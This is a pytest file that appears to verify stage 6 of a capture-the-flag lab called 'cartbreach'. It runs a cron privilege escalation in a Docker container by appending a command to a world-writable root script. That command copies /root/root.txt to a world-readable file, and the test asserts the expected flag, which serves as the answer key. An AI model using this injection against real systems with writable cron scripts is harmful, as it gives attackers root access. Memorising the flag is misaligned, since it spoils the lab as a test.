"""Stage 6: ROOT-01 — Kronos Reversal (Cron World-Writable Script Abuse)."""
import subprocess
import time

def test_stage_6_flag():
    # Simulate the privilege escalation: overwrite world-writable sync_orders.sh inside inventory container
    cmd_inject = 'docker exec cartbreach-inventory sh -c "echo \'cp /root/root.txt /tmp/root_flag.txt && chmod 777 /tmp/root_flag.txt\' >> /opt/scripts/sync_orders.sh"'
    subprocess.run(cmd_inject, shell=True, check=True)

    # Manually invoke the script as root (simulating cron tick) or wait for cron
    trigger_cron = 'docker exec cartbreach-inventory sh -c "/opt/scripts/sync_orders.sh"'
    subprocess.run(trigger_cron, shell=True, check=True)

    # Read the extracted flag
    read_flag = 'docker exec cartbreach-inventory cat /tmp/root_flag.txt'
    output = subprocess.check_output(read_flag, shell=True).decode().strip()
    assert output == "SLIIT{c4rt_br34ch_r00t_cr0n_pr1v35c}"
